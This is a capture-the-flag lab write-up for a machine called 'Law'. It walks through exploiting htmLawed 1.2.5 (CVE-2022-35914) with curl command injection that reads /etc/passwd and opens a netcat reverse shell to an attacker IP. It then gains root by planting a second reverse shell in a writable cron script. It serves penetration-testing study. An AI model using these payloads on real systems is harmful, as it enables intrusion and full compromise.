# Law

## Enumeration & scanning

- Open ports are 22 and 80.
- On 80, HTMLawed is running.

``` sh
# Standard scanning
sudo nmap -p- 192.168.226.190
```

## Exploitation

- Webserver is HTMLAWED 1.2.5, has exploit available: https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/POC_2022-35914.sh
- We validate that exploit works by getting `/etc/passwd`.

``` sh
# Validate exploit (needed to change path from POC)
curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://192.168.226.190 |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/' 
# Get reverse shell and upgrade
curl -s -d 'sid=foo&hhook=exec&text=nc 192.168.45.244 4444 -e /bin/sh' -b 'sid=foo' http://192.168.226.190 |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
nc -nlvp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Get flag
www-data@law:/var/www$ ls
ls
cleanup.sh  html  local.txt
www-data@law:/var/www$ cat local.txt
cat local.txt
63422b2eabc7d0ac6061493425e96c15
```

## Privilege Escalation

- There is a `cleanup.sh` script in the `/var/www/` folder.
- We cannot figure out what is running it, but could be crontab under root.
- We can edit the script, so we put in reverse shell and manage to catch it (needed hint for this, should have just tried).

``` sh
# Put in cleanup.sh:
nc 192.168.45.160 5555 -e /bin/sh
# Get flag
nc -nvlp 5555           
listening on [any] 5555 ...
connect to [192.168.45.160] from (UNKNOWN) [192.168.164.190] 41808
id
uid=0(root) gid=0(root) groups=0(root)
ls
email3.txt
proof.txt
cat proof.txt
f1da66e1050053f5e58fc35ea2728994
```

## References

- https://www.exploit-db.com/exploits/52023
- https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/POC_2022-35914.sh

## Rabbit holes

- Found script immediately but wanted to verify if it was being run by anything instead of just trying to put in reverse shell. Spent lot of time validating Linpeas findings such as potential vulnerability in `pkexec`. 
